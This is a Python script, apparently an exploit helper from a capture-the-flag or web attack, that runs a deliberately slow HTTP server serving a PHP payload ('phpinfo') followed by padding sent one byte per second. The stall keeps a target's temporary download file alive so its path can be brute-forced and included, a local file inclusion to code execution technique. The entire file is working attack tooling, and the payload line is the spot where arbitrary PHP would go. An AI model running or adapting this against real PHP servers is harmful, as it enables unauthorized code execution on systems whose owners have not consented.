import asyncio
import socket


# IP on which our server is listening.
LISTENING_IP = "0.0.0.0"

# Port on which our server is listening.
LISTENING_PORT = 1337

# Interesting part of the payload which can be executed if the path associated
# with the file being downloaded can be found and included.
PAYLOAD = b"<?php phpinfo(); ?>"

# Padding, which just keeps the socket open, allowing us to brute force the
# path of the downloaded file.
PADDING = 5000


def banner():
    message = '''
         d8b                         d8b                                                  
         88P                         ?88                                                  
        d88                           88b        the      real      coiffeur     .com     
 .d888b,888   d8888b  ?88   d8P  d8P  888888b  d8888b   88bd88b .d888b, d8888b .d888b,    
 ?8b,   ?88  d8P' ?88 d88  d8P' d8P'  88P `?8bd8P' ?88  88P'  ` ?8b,   d8b_,dP ?8b,       
   `?8b  88b 88b  d88 ?8b ,88b ,88'  d88   88P88b  d88 d88        `?8b 88b       `?8b     
`?888P'   88b`?8888P' `?888P'888P'  d88'   88b`?8888P'd88'     `?888P' `?888P'`?888P'     
'''
    print(message)


async def handle_client(loop: asyncio.AbstractEventLoop, client: socket.socket, _address):
    final_payload = PAYLOAD + b"\n#" +b"A" * PADDING + b"\r\n\r\n"
    content_length = str(len(final_payload)).encode()
    peer_name = client.getpeername()
    resp = (
      b"HTTP/1.1 200 OK\r\n"
      b"Content-Length: " + content_length + b"\r\n"
      b"Access-Control-Allow-Origin: *\r\n"
      b"\r\n"
    )
    await loop.sock_sendall(client, resp)

    try:
        for i in range(len(final_payload)):
            message = f"Sending byte {chr(final_payload[i]).encode()} to {peer_name} ..."
            if i >= len(PAYLOAD):
                message = f"{message} (the horse is going slow #SlowHorses)"
                await asyncio.sleep(1)
            print(message)
            await loop.sock_sendall(client, final_payload[i].to_bytes())
    except (ConnectionResetError, BrokenPipeError):
        pass
    client.close()


async def run_server(server: socket.socket):
    loop = asyncio.get_running_loop()
    while True:
        client, address = await loop.sock_accept(server)
        await asyncio.create_task(handle_client(loop, client, address))


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((LISTENING_IP, LISTENING_PORT))
    server.listen()
    print(f"Server listening on {LISTENING_IP}:{LISTENING_PORT} ...")
    asyncio.run(run_server(server))

if __name__ == "__main__":
    banner()
    main()
